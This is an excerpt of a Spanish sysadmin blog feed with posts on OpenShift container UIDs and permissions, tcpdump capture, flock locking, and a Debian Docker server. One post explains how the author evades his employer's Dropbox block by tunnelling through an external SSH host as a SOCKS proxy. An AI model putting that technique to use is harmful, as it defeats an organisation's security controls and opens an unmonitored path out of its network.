&lt;p&gt;Todo viene por una directiva de seguridad que prohibe estrictamente ejecutar un contenedor como &lt;em&gt;root&lt;/em&gt;, y de la misma manera, ejecuta el contenedor con un usuario aleatorio para incrementar la seguridad general.&lt;/p&gt;
&lt;p&gt;El problema viene para el pobre hombre que se dedica a generar imágenes, ya que la falta de determinismo, te asegura casi al 100% que no vas a poder escribir en las carpetas del contenedor, a menos que sepas lo que estás haciendo.&lt;/p&gt;
&lt;p&gt;Sin embargo, saber lo que hace &lt;strong&gt;Openshift&lt;/strong&gt; no es tarea complicada:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Se te asegura que nunca vas a usar el &lt;em&gt;uid&lt;/em&gt; 0, sino uno aleatorio&lt;/li&gt;
&lt;li&gt;El grupo del usuario de ejecución se mantiene siempre como &lt;em&gt;root&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Un problema derivado de esto es que no podemos ejecutar nada que requiera &lt;em&gt;root&lt;/em&gt;, como por ejemplo SSH (que no podríamos exponer en &lt;strong&gt;Openshift&lt;/strong&gt; de todas formas). Otro problema es que no tendremos permisos para crear carpetas en &lt;em&gt;runtime&lt;/em&gt; o incluso para cambiar el usuario de ejecución.&lt;/p&gt;
&lt;h2&gt;Simulando el comportamiento de Openshift&lt;/h2&gt;
&lt;p&gt;Vamos a poner un ejemplo tipo para entender lo que pasa:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/openshift_simulator$ cat Dockerfile
FROM python:2-slim
COPY server.py /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/server.py&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/projects/openshift_simulator$ cat server.py
&lt;span class="c1"&gt;#!/usr/bin/env python&lt;/span&gt;

from wsgiref.simple_server import make_server, demo_app

&lt;span class="nv"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; make_server&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;, &lt;span class="m"&gt;8080&lt;/span&gt;, demo_app&lt;span class="o"&gt;)&lt;/span&gt;
server.serve_forever&lt;span class="o"&gt;()&lt;/span&gt;
gerard@atlantis:~/projects/openshift_simulator$

Y lo construimos:

&lt;span class="sb"&gt;```&lt;/span&gt;bash
gerard@atlantis:~/projects/openshift_simulator$ docker build -t openshift_simulator .
Sending build context to Docker daemon  &lt;span class="m"&gt;3&lt;/span&gt;.072kB
...
Successfully tagged openshift_simulator:latest
gerard@atlantis:~/projects/openshift_simulator$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Normalmente lo ejecutaríamos de la siguiente manera:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/openshift_simulator$ docker run -ti --rm -p 8888:8080 --name test1 openshift_simulator
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que los procesos, tanto nuevos como antiguos, corren con el usuario &lt;em&gt;root&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; test1 id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
gerard@atlantis:~$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; test1 ps -efa
UID        PID  PPID  C STIME TTY          TIME CMD
root         &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:18 pts/0    &lt;span class="m"&gt;00&lt;/span&gt;:00:00 python /server.py
root        &lt;span class="m"&gt;17&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:20 ?        &lt;span class="m"&gt;00&lt;/span&gt;:00:00 ps -efa
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo, en &lt;strong&gt;openshift&lt;/strong&gt; el usuario se elige de forma aleatoria, y se impone con el &lt;em&gt;flag&lt;/em&gt; de usuario &lt;em&gt;-u&lt;/em&gt;, como sigue:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/openshift_simulator$ docker run -ti --rm -p &lt;span class="m"&gt;8888&lt;/span&gt;:8080 --name test2 -u &lt;span class="m"&gt;123456&lt;/span&gt; openshift_simulator
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y podemos ver que los procesos amparados por este contenedor se ejecutarían con el &lt;em&gt;uid&lt;/em&gt; especificado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; test2 id
&lt;span class="nv"&gt;uid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;123456&lt;/span&gt; &lt;span class="nv"&gt;gid&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;groups&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;root&lt;span class="o"&gt;)&lt;/span&gt;
gerard@atlantis:~$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; test2 ps -efa
UID        PID  PPID  C STIME TTY          TIME CMD
&lt;span class="m"&gt;123456&lt;/span&gt;       &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:22 pts/0    &lt;span class="m"&gt;00&lt;/span&gt;:00:00 python /server.py
&lt;span class="m"&gt;123456&lt;/span&gt;       &lt;span class="m"&gt;9&lt;/span&gt;     &lt;span class="m"&gt;0&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:22 ?        &lt;span class="m"&gt;00&lt;/span&gt;:00:00 ps -efa
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Implicaciones en escritura&lt;/h2&gt;
&lt;p&gt;Como no sabemos el usuario con el que vamos a ejecutar, es especialmente interesante saber donde vamos a escribir, ya que los permisos de lectura suelen ser suficientes para todo el mundo. Sin embargo, las carpetas de escritura suelen estar más restringidas.&lt;/p&gt;
&lt;p&gt;En este caso, estas carpetas tienen dos posibles salidas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Les damos barra libre con permisos 777, que no van a gustar a ningún miembro del equipo de seguridad&lt;/li&gt;
&lt;li&gt;Afinamos los permisos aprovechándonos de que nunca vamos a ser &lt;em&gt;root&lt;/em&gt;, pero vamos a ejecutar con su grupo&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De esta forma, podemos ver la propiedad y los permisos de forma individual:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Usuario&lt;/strong&gt;: con pertenencia a &lt;em&gt;root&lt;/em&gt; nos aseguramos de que los permisos no aplican nunca, con lo que podemos ponerlos como queramos.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Grupo&lt;/strong&gt;: Esta es la mejor forma de asegurar que la carpeta nos pertenece. Aquí si que tenemos que dar permisos de escritura.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Otros&lt;/strong&gt;: Nunca hay que dar permisos de escritura a este grupo; ningún auditor de seguridad lo va a permitir.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;De esta forma, la pertenencia habuitual para carpetas de lectura y escritura que suelo poner es &lt;code&gt;root:root&lt;/code&gt;, y los permisos acostumbran a ser 575, aunque no me libro de explicaciones cuando pido las excepciones de seguridad pertinentes.&lt;/p&gt;</content><category term="docker"></category><category term="openshift"></category><category term="permisos"></category></entry><entry><title>Espiando trazas de red con tcpdump</title><link href="http://www.linuxsysadmin.ml/2017/08/espiando-trazas-de-red-con-tcpdump.html" rel="alternate"></link><published>2017-08-14T10:00:00+02:00</published><updated>2017-08-14T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-08-14:/2017/08/espiando-trazas-de-red-con-tcpdump.html</id><summary type="html">&lt;p&gt;No suelen haber errores de conexión en los entornos que administro; sin embargo, alguna vez los hay. Esto supone un marrón, porque la red es ese elemento que escapa a mi gestión; la gente que se dedica a eso suele negar estos problemas argumentando cualquier excusa. Para eso está &lt;strong&gt;tcpdump …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;No suelen haber errores de conexión en los entornos que administro; sin embargo, alguna vez los hay. Esto supone un marrón, porque la red es ese elemento que escapa a mi gestión; la gente que se dedica a eso suele negar estos problemas argumentando cualquier excusa. Para eso está &lt;strong&gt;tcpdump&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Las pocas veces que tengo que recurrir a esto para conseguir evidencias siempre es una fiesta, porque como no lo utilizo de forma habitual, me olvido fácilmente de los parámetros más básicos. Y esto pretende ser una chuleta para el futuro.&lt;/p&gt;
&lt;p&gt;Normalmente solo me encargo de capturar los paquetes en un fichero de formato &lt;em&gt;.pcap&lt;/em&gt;, dejando a otro más experto en el tema el gusto de interpretarlos. Claro que muchas otras veces son usados como evidencias sin análisis previo...&lt;/p&gt;
&lt;h2&gt;Elegir la interfaz a usar&lt;/h2&gt;
&lt;p&gt;Usaremos el &lt;em&gt;flag -i&lt;/em&gt; para indicar la interfaz (o todas con &lt;em&gt;any&lt;/em&gt;), pudiendo consultar las disponibles con el flag &lt;em&gt;-D&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -D
tcpdump -i eth0
tcpdump -i any
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Filtrar por varios criterios&lt;/h2&gt;
&lt;p&gt;Como el tamaño del fichero final crece descontroladamente, vale la pena usar filtros, que en &lt;strong&gt;tcpdump&lt;/strong&gt; son combinaciones de &lt;em&gt;expresiones&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Una &lt;em&gt;expresión&lt;/em&gt; puede ser de 3 tipos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;De tipo&lt;/strong&gt;: &lt;em&gt;host&lt;/em&gt; (ej. 172.16.0.3), &lt;em&gt;net&lt;/em&gt; (ej. 10.0.0.0/8) y &lt;em&gt;port&lt;/em&gt; (ej. 443)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;De dirección&lt;/strong&gt;: &lt;em&gt;src&lt;/em&gt;, &lt;em&gt;dst&lt;/em&gt; o nada (que significa ambas)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;De protocolo&lt;/strong&gt;: &lt;em&gt;tcp&lt;/em&gt;, &lt;em&gt;udp&lt;/em&gt; o &lt;em&gt;icmp&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: Esta lista no está completa. Revisad las páginas &lt;em&gt;man&lt;/em&gt; para más detalles.&lt;/p&gt;
&lt;p&gt;Así pues, para filtrar el tráfico que se origina en una red local 192.168.1.0/24, podríamos usar algo como:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -i any src net &lt;span class="m"&gt;192&lt;/span&gt;.168.1.0/24
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos combinar grupos de expresiones con los operadores &lt;em&gt;not&lt;/em&gt;, &lt;em&gt;or&lt;/em&gt; y &lt;em&gt;and&lt;/em&gt;, con uso de paréntesis para priorizar operadores.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump src &lt;span class="m"&gt;10&lt;/span&gt;.0.2.4 and &lt;span class="o"&gt;(&lt;/span&gt;dst port &lt;span class="m"&gt;3389&lt;/span&gt; or &lt;span class="m"&gt;22&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Captura de un fichero para su uso posterior&lt;/h2&gt;
&lt;p&gt;Ver los paquetes en local es una opción válida, pero dependiendo del volumen de tráfico capturado puede resultar en dejarse la vista. En estos casos es más fácil guardar el resultado en un fichero que luego pueda ser leído, por el mismo &lt;strong&gt;tcpdump&lt;/strong&gt; (con el &lt;em&gt;flag -r&lt;/em&gt;), o por una cómoda aplicación de escritorio, como por ejemplo, &lt;a href="https://www.wireshark.org/"&gt;Wireshark&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;En este caso, basta con utilizar un &lt;em&gt;flag&lt;/em&gt; que le indique que tiene que guardar un fichero. Este &lt;em&gt;flag&lt;/em&gt; es el &lt;em&gt;flag -w&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;tcpdump -i eth0 tcp -w traffic.pcap
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;&lt;em&gt;Y con estas pinceladas básicas, podemos aportar evidencias para que el experto se lo mire&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="tcpdump"></category><category term="red"></category><category term="trazas"></category><category term="evidencias"></category></entry><entry><title>Evitando problemas de concurrencia múltiple con flock</title><link href="http://www.linuxsysadmin.ml/2017/08/evitando-problemas-de-concurrencia-multiple-con-flock.html" rel="alternate"></link><published>2017-08-07T10:00:00+02:00</published><updated>2017-08-07T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-08-07:/2017/08/evitando-problemas-de-concurrencia-multiple-con-flock.html</id><summary type="html">&lt;p&gt;Cuando trabajas con procesos en &lt;em&gt;background&lt;/em&gt;, es fácil que algunos de los procesos hagan algo que necesite exclusividad, no siendo seguro ejecutar varios de estos procesos a la vez. Por ejemplo, archivos que se descomprimen, se procesan y luego se borran; si usan la misma carpeta suele ser un problema …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando trabajas con procesos en &lt;em&gt;background&lt;/em&gt;, es fácil que algunos de los procesos hagan algo que necesite exclusividad, no siendo seguro ejecutar varios de estos procesos a la vez. Por ejemplo, archivos que se descomprimen, se procesan y luego se borran; si usan la misma carpeta suele ser un problema.&lt;/p&gt;
&lt;p&gt;No vamos a entrar en como se lanzan estos procesos, pero vamos a dar énfasis en que no deben ejecutarse a la vez. Para ello, vamos a suponer que tenemos un proceso que nos interesa ejecutar en exclusividad. Voy a sustituir este proceso por un &lt;em&gt;script&lt;/em&gt;, para que no nos distraigamos del punto importante.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/flock_test$ cat process.sh 
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +%H:%M:%S&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Starting process in terminal &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
sleep &lt;span class="m"&gt;5&lt;/span&gt;
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="k"&gt;$(&lt;/span&gt;date +%H:%M:%S&lt;span class="k"&gt;)&lt;/span&gt;&lt;span class="s2"&gt; - Process ended in terminal &lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/flock_test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Muchos de los desarrolladores os propondrían miles de soluciones para evitar este caso, pero si buscamos en la &lt;em&gt;toolbox&lt;/em&gt; de Linux, podemos encontrar herramientas útiles. En mi caso concreto encontré el comando &lt;strong&gt;flock&lt;/strong&gt;, que actúa bloqueando un comando, en base a la existencia de un fichero de &lt;em&gt;lock&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Ejecutando casi concurrentemente&lt;/h2&gt;
&lt;p&gt;Para conseguirlo, voy a abrir dos terminales, uno para cada proceso. El &lt;em&gt;script&lt;/em&gt; va a recibir el numero de terminal por un parámetro, que voy a poner manualmente.&lt;/p&gt;
&lt;p&gt;Vamos al primer terminal, y ejecutamos nuestro &lt;em&gt;script&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/flock_test$ ./process.sh &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:38 - Starting process in terminal &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:43 - Process ended in terminal &lt;span class="m"&gt;1&lt;/span&gt;
gerard@aldebaran:~/flock_test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Antes de que acabe, cambio al otro terminal y ejecuto lo mismo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/flock_test$ ./process.sh &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:40 - Starting process in terminal &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:45 - Process ended in terminal &lt;span class="m"&gt;2&lt;/span&gt;
gerard@aldebaran:~/flock_test$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Si juntamos las líneas de &lt;em&gt;log&lt;/em&gt; y las ordenamos, vemos claramente que los procesos estuvieron en algún momento ejecutándose a la vez.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;:43:38 - Starting process in terminal &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:40 - Starting process in terminal &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:43 - Process ended in terminal &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:43:45 - Process ended in terminal &lt;span class="m"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, no parece peligroso que se ejecuten a la vez, pero hay que usar la imaginación y creernos que podrían dar problemas ejecutados a la vez.&lt;/p&gt;
&lt;h2&gt;Ejecución exclusiva con flock&lt;/h2&gt;
&lt;p&gt;Como puede interesarnos que no se ejecuten a la vez, podemos utilizar el comando &lt;strong&gt;flock&lt;/strong&gt; para conseguir que ambos procesos esperen ordenadamente la posibilidad de ejecutarse.&lt;/p&gt;
&lt;p&gt;El comando &lt;strong&gt;flock&lt;/strong&gt; esperaría la inexistencia de un &lt;em&gt;lock&lt;/em&gt; en el fichero indicado, momento en el que pondría dicho &lt;em&gt;lock&lt;/em&gt; para asegurar que ningún otro proceso pudiera ejecutarse. Lo siguiente sería ejecutar nuestro &lt;em&gt;script&lt;/em&gt;, y finalmente, eliminar el &lt;em&gt;lock&lt;/em&gt; puesto. Otro proceso concurrente quedaría a la espera de la liberación de &lt;em&gt;lock&lt;/em&gt; antes de poder proceder, de manera similar al anterior.&lt;/p&gt;
&lt;p&gt;El proceso va a ser el mismo: ejecutamos el &lt;em&gt;script&lt;/em&gt; en ambos terminales, prefijado esta vez por el comando &lt;strong&gt;flock&lt;/strong&gt; y el fichero sobre el que se va a poner el &lt;em&gt;lock&lt;/em&gt;. Pasamos a juntar las líneas de ambos terminales por brevedad:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="m"&gt;12&lt;/span&gt;:44:59 - Starting process in terminal &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:45:04 - Process ended in terminal &lt;span class="m"&gt;1&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:45:04 - Starting process in terminal &lt;span class="m"&gt;2&lt;/span&gt;
&lt;span class="m"&gt;12&lt;/span&gt;:45:09 - Process ended in terminal &lt;span class="m"&gt;2&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto podemos ver que el proceso del terminal 2 ha tenido que esperar a que el comando &lt;strong&gt;flock&lt;/strong&gt; en el primer terminal acabara, antes de poder proceder a ejecutar su &lt;em&gt;script&lt;/em&gt;. Con eso se garantiza la exclusividad de ejecución y los problemas que podría haber derivados de esta situación.&lt;/p&gt;
&lt;p&gt;En un caso de &lt;em&gt;boom&lt;/em&gt; de procesos, podríamos ver un grupo de procesos esperando sin lanzar sus respectivos &lt;em&gt;scripts&lt;/em&gt;, mientras que uno solo de ello estaría ejecutando en exclusividad.&lt;/p&gt;</content><category term="flock"></category></entry><entry><title>Ignorando el proxy de mi empresa: un proxy SOCKS</title><link href="http://www.linuxsysadmin.ml/2017/07/ignorando-el-proxy-de-mi-empresa-un-proxy-socks.html" rel="alternate"></link><published>2017-07-31T10:00:00+02:00</published><updated>2017-07-31T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-31:/2017/07/ignorando-el-proxy-de-mi-empresa-un-proxy-socks.html</id><summary type="html">&lt;p&gt;Tenemos en el trabajo uno de esos &lt;em&gt;enginjerks&lt;/em&gt; que lanzan acciones &lt;em&gt;random&lt;/em&gt; para justificar su trabajo. Cortó el acceso a &lt;em&gt;Dropbox&lt;/em&gt;, en donde tengo cosas útiles para mi trabajo. Harto de encender los datos móviles de mi móvil para ir sincronizando ficheros, me he montado un proxy &lt;strong&gt;SOCKS&lt;/strong&gt; para mí …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Tenemos en el trabajo uno de esos &lt;em&gt;enginjerks&lt;/em&gt; que lanzan acciones &lt;em&gt;random&lt;/em&gt; para justificar su trabajo. Cortó el acceso a &lt;em&gt;Dropbox&lt;/em&gt;, en donde tengo cosas útiles para mi trabajo. Harto de encender los datos móviles de mi móvil para ir sincronizando ficheros, me he montado un proxy &lt;strong&gt;SOCKS&lt;/strong&gt; para mí.&lt;/p&gt;
&lt;p&gt;Se trata de una tocada de narices tener que encender los datos móviles de mi &lt;em&gt;smartphone&lt;/em&gt; para sincronizar la carpeta de &lt;em&gt;Dropbox&lt;/em&gt; periódicamente. También es completamente inútil como medida de seguridad, puesto que muevo con frecuencia mi ordenador portátil por obligaciones profesionales.&lt;/p&gt;
&lt;p&gt;Sin embargo, hay un acceso más allá de los puertos 80 y 443; se trata del puerto 22, específicamente hacia un servidor bastión que nos sirve para acceder a los entornos en donde corren nuestras aplicaciones. Por supuesto están fuera de nuestra infraestructura.&lt;/p&gt;
&lt;p&gt;La idea es muy simple: levantamos un &lt;em&gt;proxy SOCKS&lt;/em&gt; en la máquina remota (con pleno acceso a internet), en un puerto al que podamos llegar con nuestro ordenador; configuramos nuestro ordenador para usar ese &lt;em&gt;proxy&lt;/em&gt; remoto. Alternativamente, como no tengo más puertos por los que pasar, puedo levantar el puerto del &lt;em&gt;proxy&lt;/em&gt; en mi mismo ordenador, de la misma forma que los túneles SSH.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico&lt;/h2&gt;
&lt;p&gt;Vamos a suponer que tenemos dos máquinas; también vamos a suponer que levantamos el &lt;em&gt;proxy SOCKS&lt;/em&gt; en nuestro escritorio:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;alphacentauri&lt;/strong&gt;: Es nuestra máquina remota, tiene instalado &lt;strong&gt;SSH&lt;/strong&gt; y tiene acceso libre a internet.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;capella&lt;/strong&gt;: es nuestro escritorio, en donde desarrollamos nuestro trabajo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El responsable de levantar el &lt;em&gt;proxy SOCKS&lt;/em&gt; es el mismo SSH. Para ello basta el &lt;em&gt;flag -D&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@capella:~$ ssh -N -D &lt;span class="m"&gt;9999&lt;/span&gt; proxy@alphacentauri -p &lt;span class="m"&gt;2222&lt;/span&gt; -f
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;alphacentauri:2222&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
gerard@capella:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hay una serie de consideraciones en este comando:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Existe un usuario &lt;em&gt;proxy&lt;/em&gt; en &lt;em&gt;alphacentauri&lt;/em&gt;. Es un usuario normal y tenemos autenticación por par de claves (opcional, pero muy cómodo).&lt;/li&gt;
&lt;li&gt;Por cortesía del &lt;em&gt;flag -N&lt;/em&gt; no vamos a abrir un terminal.&lt;/li&gt;
&lt;li&gt;El &lt;em&gt;flag -f&lt;/em&gt; nos levanta el &lt;em&gt;proxy&lt;/em&gt; en &lt;em&gt;background&lt;/em&gt;, que nos evita bloquear el terminal pero exige el par de claves.&lt;/li&gt;
&lt;li&gt;El servidor SSH en &lt;em&gt;alphacentauri&lt;/em&gt; escucha en el puerto 2222, y por eso usamos el &lt;em&gt;flag -p&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;Gracias al &lt;em&gt;flag -D&lt;/em&gt;, el &lt;em&gt;proxy&lt;/em&gt; se levanta en el puerto 9999, escuchando en &lt;em&gt;localhost&lt;/em&gt; (por defecto).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;A partir de este momento, todas las conexiones que usen &lt;em&gt;localhost:9999&lt;/em&gt; como &lt;em&gt;proxy SOCKS&lt;/em&gt;, van a acceder a internet como lo hace la máquina &lt;em&gt;alphacentauri&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Sin más esperas, vamos al cliente de &lt;em&gt;dropbox&lt;/em&gt;; podemos configurar el &lt;em&gt;proxy&lt;/em&gt; en "Preferencias &amp;gt; Proxies". Basta con indicar la opción "Tipo de proxy" como "SOCKS5" y el servidor como "127.0.0.1:9999".&lt;/p&gt;
&lt;p&gt;Como ya sabemos que los túneles SSH se caen, os recomiendo altamente usar un mecanismo de levantamiento automático, como &lt;em&gt;autossh&lt;/em&gt; o directamente &lt;a href="http://www.linuxsysadmin.ml/2016/11/levantando-tuneles-ssh-con-systemd.html"&gt;usando SystemD&lt;/a&gt;.&lt;/p&gt;</content><category term="ssh"></category><category term="proxy"></category><category term="socks"></category></entry><entry><title>Montando un servidor docker con Debian Stretch</title><link href="http://www.linuxsysadmin.ml/2017/07/montando-un-servidor-docker-con-debian-stretch.html" rel="alternate"></link><published>2017-07-24T10:00:00+02:00</published><updated>2017-07-24T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-07-24:/2017/07/montando-un-servidor-docker-con-debian-stretch.html</id><summary type="html">&lt;p&gt;Finalmente ha sucedido: ha llegado el esperado lanzamiento de &lt;strong&gt;Debian Stretch&lt;/strong&gt;. Como buen linuxero no me he podido resistir a hacer alguna instalación para probar, aunque solo sea como una máquina virtual. Su función, determinada por mi actual flujo de trabajo, va a ser como servidor de &lt;strong&gt;docker&lt;/strong&gt; con &lt;strong&gt;docker-compose …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Finalmente ha sucedido: ha llegado el esperado lanzamiento de &lt;strong&gt;Debian Stretch&lt;/strong&gt;. Como buen linuxero no me he podido resistir a hacer alguna instalación para probar, aunque solo sea como una máquina virtual. Su función, determinada por mi actual flujo de trabajo, va a ser como servidor de &lt;strong&gt;docker&lt;/strong&gt; con &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
